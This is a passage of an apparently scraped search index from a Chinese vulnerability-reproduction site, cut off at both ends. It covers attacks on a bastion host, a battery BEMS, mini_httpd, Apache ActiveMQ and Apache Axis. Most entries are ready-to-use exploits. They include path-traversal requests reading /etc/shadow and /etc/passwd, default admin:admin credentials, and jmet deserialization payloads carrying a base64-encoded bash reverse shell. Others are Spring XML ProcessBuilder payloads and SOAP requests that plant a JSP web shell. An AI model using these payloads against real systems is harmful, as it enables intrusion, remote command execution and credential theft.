","date":"0001-01-01","objectID":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"齐治科技-堡垒机\" ","date":"0001-01-01","objectID":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞POC为 http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1\u0026id=%5C\u0026uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23\u0026login=shterm ","date":"0001-01-01","objectID":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA-gui_detail_view.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"龙璟科技 电池能量BEMS downloads 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 龙璟科技 电池能量BEMS 存在接口可任意文件下载获取服务器任意文件信息 ","date":"0001-01-01","objectID":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 龙璟科技 电池能量BEMS ","date":"0001-01-01","objectID":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=电池能量管理系统 BEMS ","date":"0001-01-01","objectID":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC /api/downloads?fileName=../../../../../../../../etc/shadow ","date":"0001-01-01","objectID":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E9%BE%99%E7%92%9F%E7%A7%91%E6%8A%80-%E7%94%B5%E6%B1%A0%E8%83%BD%E9%87%8Fbems-downloads-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"ACME Mini_httpd 任意文件读取漏洞 CVE-2018-18778 ","date":"0001-01-01","objectID":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/:0:0","tags":null,"title":"","uri":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/"},{"categories":null,"content":"漏洞描述 漏洞原因是由于没有过滤Http包头的特定字段，导致可以构造访问系统文件的路径，从而导致可访问任意文件，攻击者可以利用该漏洞读取设备的任意文件，这将严重威胁采用Mini_httpd的设备的安全性。 ","date":"0001-01-01","objectID":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/:1:0","tags":null,"title":"","uri":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/"},{"categories":null,"content":"漏洞影响 ACME mini_httpd before 1.30 ","date":"0001-01-01","objectID":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/:2:0","tags":null,"title":"","uri":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/"},{"categories":null,"content":"网络测绘 app=\"ACME-mini_httpd\" ","date":"0001-01-01","objectID":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/:3:0","tags":null,"title":"","uri":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/"},{"categories":null,"content":"漏洞复现 指纹信息 在mini_httpd开启虚拟主机模式的情况下，用户请求http://HOST/FILE将会访问到当前目录下的HOST/FILE文件。 当HOST=example.com、FILE=index.html的时候，上述语句结果为example.com/index.html，文件正常读取。 当HOST为空、FILE=etc/passwd的时候，上述语句结果为/etc/passwd。 (void) snprintf( vfile, sizeof(vfile), \"%s/%s\", req_hostname, f ); 发送请求包, 置空 host GET /etc/passwd HTTP/1.1 Host: Accept: text/plain, */*; q=0.01 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 0 Referer: http://192.168.0.144:8080/ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 x-requested-with: XMLHttpRequest ","date":"0001-01-01","objectID":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/:4:0","tags":null,"title":"","uri":"/acme-mini_httpd-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2018-18778/"},{"categories":null,"content":"Apache ActiveMQ Console控制台默认弱口令 ","date":"0001-01-01","objectID":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/:0:0","tags":null,"title":"","uri":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"categories":null,"content":"漏洞描述 Apache ActiveMQ Console 存在默认弱口令 admin:admin，进入控制台后可被进一步恶意利用 ","date":"0001-01-01","objectID":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/:1:0","tags":null,"title":"","uri":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"categories":null,"content":"漏洞影响 Apache ActiveMQ ","date":"0001-01-01","objectID":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/:2:0","tags":null,"title":"","uri":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"categories":null,"content":"漏洞复现 Apache ActiveMQ 默认开启了 8186 控制台 访问目标: http://xxx.xxx.xxx.xxx:8161/admin 使用默认口令 admin:admin ","date":"0001-01-01","objectID":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/:3:0","tags":null,"title":"","uri":"/apache-activemq-console%E6%8E%A7%E5%88%B6%E5%8F%B0%E9%BB%98%E8%AE%A4%E5%BC%B1%E5%8F%A3%E4%BB%A4/"},{"categories":null,"content":"Apache ActiveMQ 信息泄漏漏洞 CVE-2017-15709 ","date":"0001-01-01","objectID":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/:0:0","tags":null,"title":"","uri":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/"},{"categories":null,"content":"漏洞描述 Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。 会返回应用名称，JVM，操作系统以及内核版本等信息。 ","date":"0001-01-01","objectID":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/:1:0","tags":null,"title":"","uri":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/"},{"categories":null,"content":"漏洞影响 apache-activemq-5.15.0 to apache-activemq-5.15.2 apache-activemq-5.14.0 to apache-activemq-5.14.5 ","date":"0001-01-01","objectID":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/:2:0","tags":null,"title":"","uri":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/:3:0","tags":null,"title":"","uri":"/apache-activemq-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E-cve-2017-15709/"},{"categories":null,"content":"Apache ActiveMQ 反序列化漏洞 (CVE-2015-5254) ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:0:0","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"漏洞描述 Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。 ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:1:0","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"漏洞影响 Apache ActiveMQ 5.13.0之前5.x版本 ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:2:0","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"环境配置 ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:3:0","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"安装jdk 查看java版本，如果是java 11需要切换到java 8 java -version 安装java 8，默认安装路径/usr/lib/jvm/java-8-openjdk-amd64 sudo apt install openjdk-8-jdk 配置环境变量，添加jdk安装路径 sudo vim ~/.bashrc # 在最后一行添加 export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64 ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:3:1","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"切换jdk版本 采用update-alternatives命令进行版本切换 /usr/bin/java和/usr/lib/jvm/java-8-openjdk-amd64/bin/java两个路径一定要和自己的路径吻合 sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-8-openjdk-amd64/bin/java 1070 切换jdk sudo update-alternatives --config java 再次查看java版本，切换成功 ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:3:2","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"漏洞复现 下载 jmet 下载链接 wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external 对目标发送一个生成**/tmp/vuln**的 payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/awesome_poc\" -Yp ROME 192.168.174.128 61616 访问 http://192.168.174.128:8161/admin/browse.jsp?JMSDestination=event 可以看到多了一条消息队列，ID为kali-38087-1645421794512-1:1:1:1:1 点击这个信息触发文件创建，成功执行命令 touch /tmp/awesome_poc 也可以创建一个反弹shell的payload bash -i \u003e\u0026 /dev/tcp/192.168.174.128/9999 0\u003e\u00261 (base64编码) YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i} # 发送payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 192.168.174.128 61616 查看消息队列，ID为kali-38435-1645422155171-1:1:1:1:1 监听9999端口，点击消息队列会触发命令执行，反弹Shell ","date":"0001-01-01","objectID":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/:3:3","tags":null,"title":"","uri":"/apache-activemq-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2015-5254/"},{"categories":null,"content":"Apache ActiveMQ远程代码执行 ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:0:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞描述 Apache ActiveMQ 是 Apache 软件基金会研发的一个开源消息中间件，为应用程序提供高效的、可扩展的、稳定的和安全的企业级消息通信。 当未经身份认证的攻击者访问 Apache ActiveMQ 的 61616 端口时，可通过发送恶意数据在远程服务器上执行代码，进而控制 Apache ActiveMQ 服务器。 更新日期：2023-10-25 参考链接： https://activemq.apache.org/activemq-5016006-release https://github.com/Fw-fW-fw/activemq_Throwable ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:1:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞影响 Apache ActiveMQ \u003c 5.18.3 ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:2:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"环境搭建 在 ActiveMQ 官方下载 5.16.6 版本安装包，链接：https://activemq.apache.org/activemq-5016006-release 解压安装包，在目录 ./apache-activemq-5.16.6/bin/linux-x86-64 下以控制台模式启动，方便排查报错信息，注意使用 jdk 11： ./activemq console 访问 8161 端口管理页面： ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:3:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"漏洞复现 编写 poc.xml，托管在 8080 端口。开启 http 服务： python3 -m http.server 8080 执行命令： touch /tmp/success ------- base64编码：dG91Y2ggL3RtcC9zdWNjZXNz poc.xml（注意缩进）： \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"\u003e \u003cconstructor-arg \u003e \u003clist\u003e \u003cvalue\u003ebash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003e{echo,dG91Y2ggL3RtcC9zdWNjZXNz}|{base64,-d}|{bash,-i}\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003c/beans\u003e 使用 poc 进行复现： java -jar activemq_poc.jar 127.0.0.1 61616 http://127.0.0.1:8080/poc.xml 成功执行 touch /tmp/success： 反弹 shell 的 poc.xml： \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"\u003e \u003cconstructor-arg \u003e \u003clist\u003e \u003cvalue\u003ebash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003e{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=}|{base64,-d}|{bash,-i}\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003c/beans\u003e ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:4:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"修复建议 根据影响版本中的信息，排查并升级到安全版本，或直接访问参考链接获取官方更新指南。补丁下载链接：https://github.com/apache/activemq/tags ","date":"0001-01-01","objectID":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/:5:0","tags":null,"title":"","uri":"/apache-activemq%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"},{"categories":null,"content":"Apache Axis 远程代码执行漏洞 ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:0:0","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"漏洞描述 Apache Axis 服务被用于部署各种接口服务。其中，AdminService 接口允许管理员远程访问管理服务，相关配置在 /axis/WEB-INF/server-config.wsdd(部署应用后产生)，其中enableRemoteAdmin默认为false，只允许本地管理。 若将enableRemoteAdmin设置为true，则可以执行 JNDI 注入，执行任意代码或反弹 Shell。 ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:1:0","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"环境搭建 下载 axis bin 解压，将 webapps 下 axis 文件夹复制到 tomcat 环境下 webapps 目录下。 修改环境变量： vim ~/.profile export AXIS_HOME=/usr/tomcat/apache-tomcat-8.5.90/webapps/axis export AXIS_LIB=$AXIS_HOME/WEB-INF/lib export AXISCLASSPATH=$AXIS_LIB/axis.jar:$AXIS_LIB/commons-discovery-0.2.jar:$AXIS_LIB/commons-logging-1.0.4.jar:$AXIS_LIB/jaxrpc.jar:$AXIS_LIB/saaj.jar:$AXIS_LIB/log4j-1.2.8.jar:$AXIS_LIB/xml-apis.jar:$AXIS_LIB/xercesImpl.jar:$AXIS_LIB/wsdl4j-1.5.1.jar 刷新环境变量： source ~/.profile 开启RemoteAdmin服务： vim webapps/axis/WEB-INF/deploy.wsdd \u003cdeployment xmlns=\"http://xml.apache.org/axis/wsdd/\" xmlns:java=\"http://xml.apache.org/axis/wsdd/providers/java\"\u003e \u003cservice name=\"AdminService\" provider=\"java:MSG\"\u003e \u003cparameter name=\"className\" value=\"org.apache.axis.utils.Admin\"/\u003e \u003cparameter name=\"allowedMethods\" value=\"*\"/\u003e \u003cparameter name=\"enableRemoteAdmin\" value=\"true\"/\u003e \u003c/service\u003e \u003c/deployment\u003e 刷新配置： java -cp $AXISCLASSPATH org.apache.axis.client.AdminClient deploy.wsdd ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:2:0","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"漏洞复现 ","date":"0001-01-01","objectID":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/:3:0","tags":null,"title":"","uri":"/apache-axis-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2019-0227/"},{"categories":null,"content":"RandomService 报错getshell 注册服务，指定日志目录为shell路径： \u003cparameter name=\"LogHandler.fileName\" value=\"../webapps/axis/shell.jsp\" /\u003e POST /axis/services/AdminService HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: \"\" Content-Length: 1059 User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: close \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Body\u003e \u003cns1:deployment xmlns=\"http://xml.apache.org/axis/wsdd/\" xmlns:java=\"http://xml.apache.org/axis/wsdd/providers/java\" xmlns:ns1=\"http://xml.apache.org/axis/wsdd/\"\u003e \u003cns1:service name=\"RandomService\" provider=\"java:RPC\"\u003e \u003crequestFlow\u003e \u003chandler type=\"RandomLog\"/\u003e \u003c/requestFlow\u003e \u003cns1:parameter name=\"className\" value=\"java.util.Random\"/\u003e \u003cns1:parameter name=\"allowedMethods\" value=\"*\"/\u003e \u003c/ns1:service\u003e \u003chandler name=\"RandomLog\" type=\"java:org.apache.axis.handlers.LogHandler\" \u003e \u003cparameter name=\"LogHandler.fileName\" value=\"../webapps/axis/shell.jsp\" /\u003e \u003cparameter name=\"LogHandler.writeToConsole\" value=\"false\" /\u003e \u003c/handler\u003e \u003c/ns1:deployment\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e 请求RandomService，利用报错将错误日志写入到shell文件： POST /axis/services/RandomService HTTP/1.1 Host: your-ip:8080 Accept-Encoding: gzip, deflate Content-Type: text/xml;charset=UTF-8 SOAPAction: \"\" Content-Length: 874 User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: close \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003csoapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:api=\"http://127.0.0.1/Integrics/Enswitch/API\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\u003e \u003csoapenv:Body\u003e \u003capi:main soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"\u003e \u003capi:in0\u003e\u003c![CDATA[ \u003c%@page import=\"java.util.*,java.io.*\"%\u003e\u003c% if (request.getParameter(\"c\") != null) { Process p = Runtime.getRuntime().exec(request.getParameter(\"c\")); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); }; p.destroy(); }%\u003e ]]\u003e \u003c/api:in0\u003e \u003c/api:main\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e shell 地址： view-source:http://your-ip:8080/axis/shell.jsp?c=pwd 这里的 shell 写入路径 LogHandler.fileName 为 ../webapps/axis/shell.jsp，实际遇到的目标启动路径可能不同，需要根据实际对写入的路径做相应的变动。 卸载服务： POST /axis/services/AdminService HTTP/1.1 Host: your-ip:8080 Connection: close Accept: 